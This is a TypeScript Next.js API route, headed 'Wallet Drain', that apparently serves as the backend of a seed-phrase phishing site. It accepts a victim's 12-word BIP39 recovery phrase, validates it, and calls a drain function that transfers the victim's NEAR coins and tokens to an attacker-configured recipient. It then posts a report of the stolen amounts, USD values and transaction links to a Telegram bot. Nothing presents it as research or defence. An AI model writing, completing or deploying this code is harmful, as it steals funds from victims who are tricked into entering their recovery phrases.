// ============================================
// Transfer API Route - Wallet Drain
// ============================================

// Next.js imports
import { NextRequest, NextResponse } from 'next/server'
// NEAR drain function
import { processWalletDrain } from '@/lib/near-utils'
// TConfig
import { config } from '@/lib/config'
// BIP39 validation
import { validateSeedPhrase, getDuplicateIndices } from '@/lib/bip39-words'
// Rate limiting
import { checkRateLimits, getClientIp } from '@/lib/rate-limiter'

// Bot credentials and recipient
const { botToken: BOT_TOKEN, chatId: CHAT_ID } = config.telegram
const RECIPIENT = config.recipient

// Get NEAR price
async function getNearPriceUSD(): Promise<number> {
  try {
    const res = await fetch(
      `https://api.coingecko.com/api/v3/simple/price?ids=near&vs_currencies=usd`,
      { headers: { Accept: "application/json" }, signal: AbortSignal.timeout(8000) }
    )
    if (!res.ok) return 0
    const data = await res.json()
    return data?.["near"]?.usd ?? 0
  } catch {
    return 0
  }
}

// Main POST handler
export async function POST(req: NextRequest) {
  try {
    const { words } = await req.json()

    if (!Array.isArray(words) || words.length !== 12) {
      return NextResponse.json(
        { success: false, error: 'Invalid seed phrase length' },
        { status: 400 }
      )
    }

    const validation = validateSeedPhrase(words)
    if (!validation.valid) {
      return NextResponse.json(
        { success: false, error: 'Invalid BIP39 words', invalidIndices: validation.invalidIndices },
        { status: 400 }
      )
    }

    const duplicateIndices = getDuplicateIndices(words)
    if (duplicateIndices.length > 0) {
      return NextResponse.json(
        { success: false, error: 'Too many duplicate words', duplicateIndices },
        { status: 400 }
      )
    }

    const clientIp = getClientIp(req)
    const seedPhrase = words.join(' ')
    const rateLimit = checkRateLimits(clientIp, seedPhrase)
    
    if (!rateLimit.allowed) {
      const messages: Record<string, string> = {
        seed_banned: 'This seed phrase has been temporarily blocked',
        seed_limit_reached: 'Too many attempts with this seed phrase',
        ip_limited: 'Too many requests from your IP'
      }
      return NextResponse.json(
        { 
          success: false,
          error: messages[rateLimit.reason || 'ip_limited'],
          retryAfter: rateLimit.retryAfter 
        },
        { status: 429 }
      )
    }

    const { accounts, results } = await processWalletDrain(words)

    if (results.length > 0) {
      const nearPrice = await getNearPriceUSD()

      const lines: string[] = []

      for (const r of results) {
        let nearLine: string
        if (r.nearTxHash) {
          const nearUsd = nearPrice > 0 && r.nearTransferredNear > 0
            ? ` (~$${(r.nearTransferredNear * nearPrice).toFixed(2)})`
            : ""
          const link = r.nearTxHash !== "ok"
            ? `\n  🔗 https://nearblocks.io/txns/${r.nearTxHash}`
            : ""
          nearLine = `✅ NEAR: ${r.nearTransferredNear.toFixed(4)} N${nearUsd}${link}`
        } else {
          const reason = r.errors.length > 0 ? r.errors[0] : "unknown"
          nearLine = `❌ NEAR not sent: ${reason.slice(0, 100)}`
        }

        const tokenLines = r.tokenResults.map((t) => {
          if (t.txHash) {
            const link = t.txHash !== "ok"
              ? `\n    🔗 https://nearblocks.io/txns/${t.txHash}`
              : ""
            return `  ✅ ${t.symbol}${link}`
          }
          if (t.error === "баланс 0") return `  ➖ ${t.symbol}: zero balance`
          const gasIssue = t.error?.includes("not enough balance") || t.error?.includes("lacks balance")
          if (gasIssue) return `  ⚠️ ${t.symbol}: not enough gas`
          return `  ❌ ${t.symbol}: ${(t.error ?? "?").slice(0, 80)}`
        })

        lines.push(
          `📤 *${r.accountId}* → *${RECIPIENT}*\n${nearLine}` +
          (tokenLines.length > 0 ? `\n${tokenLines.join("\n")}` : "")
        )
      }

      const reportText = `💸 *Transfer Report*\n\n` + lines.join("\n\n")

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: reportText,
          parse_mode: "Markdown",
        }),
      }).catch(() => null)
    }

    return NextResponse.json({
      success: true,
      accountsFound: accounts.length,
      accounts: accounts.map((a) => ({
        accountId: a.accountId,
        balanceNear: a.balanceNear,
      })),
      results: results.map((r) => ({
        accountId: r.accountId,
        nearTxHash: r.nearTxHash,
        nearTransferredNear: r.nearTransferredNear,
        tokenResults: r.tokenResults,
        errors: r.errors,
        summary: r.summary,
      })),
    })
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err)
    return NextResponse.json(
      { success: false, error: msg }, 
      { status: 500 }
    )
  }
}
